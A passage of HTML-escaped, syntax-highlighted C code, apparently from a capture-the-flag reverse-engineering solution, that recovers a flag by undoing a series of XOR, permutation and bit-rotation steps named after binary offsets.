        &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//printf(&quot;table1[%d]: %ldbyte, \\x0%x\n&quot;, i, sizeof(table1[i]), table1[i]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rev6_sub_172E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rev5_sub_16e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rev4_sub_15bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rev3_sub_14ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;14ed output: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0x%02x &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rev2_sub_1447&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;table1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rev2_sub_1447&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;table1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rev2_sub_1447&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;table1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rev2_sub_1447&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;table1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1447 output: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0x%02x &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rev1_sub_1215&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_len1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev1_sub_1215&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev2_sub_1447&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev3_sub_14ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev4_sub_15bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rev4_1_sub_1545&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rev4_2_sub_1580&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rev4_1_sub_1545&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rev4_2_sub_1580&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev4_1_sub_1545&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 4k, 4k+2nd elements&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

